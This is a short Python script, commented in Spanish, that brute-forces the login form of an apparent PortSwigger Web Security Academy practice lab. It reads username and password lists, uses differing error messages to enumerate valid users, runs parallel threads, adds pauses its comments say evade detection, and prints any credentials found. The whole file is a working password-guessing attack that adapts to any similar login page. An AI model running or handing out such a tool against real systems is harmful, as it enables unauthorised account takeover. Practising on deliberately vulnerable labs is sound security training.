import requests
import time
from concurrent.futures import ThreadPoolExecutor

# URL del formulario de inicio de sesión (modificar según el entorno de prueba)
URL = 'https://0a18005104b93cc6810b70d700d200d4.web-security-academy.net/login'

# Cargar listas de usuarios y contraseñas desde archivos
with open('users.txt', 'r') as users_file:
    usernames = users_file.read().splitlines()

with open('pswd.txt', 'r') as pwd_file:
    passwords = pwd_file.read().splitlines()

# Configuración de concurrencia
MAX_THREADS = 5  # Número de hilos en paralelo
session = requests.Session()  # Reutiliza la sesión para mayor eficiencia

# Función de ataque a una combinación de usuario y contraseña
def brute_force(username):
    try:
        for password in passwords:
            data = {'username': username, 'password': password}
            res = session.post(URL, data=data)

            # Verificar si el usuario es inválido
            if "Invalid username" in res.text:
                print(f"[-] Usuario no válido: {username} (saltando a otro usuario)")
                return  # Rompe el bucle y pasa al siguiente usuario

            # Verificar si la contraseña es incorrecta
            if "Incorrect password" in res.text:
                print(f"[-] Incorrecto: {username}:{password}")
                continue  # Sigue probando con el mismo usuario

            # Si llegamos aquí, credenciales correctas
            print(f"\n[🔥] ¡Credenciales encontradas!\nUsername: {username}\nPassword: {password}\n")
            exit()  # Se detiene el script en caso de obtener exito

            time.sleep(0.5)  # Tiempo de espera para evitar reconocimiento del ataque

    except requests.exceptions.RequestException as e:
        print(f"[!] Error de conexión con {username} - {e}")
        time.sleep(5)  # Espera para evitar bloqueo

# Función para probar todos los usuarios en paralelo
def start_attack():
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(brute_force, usernames)

# Iniciar ataque
start_attack()
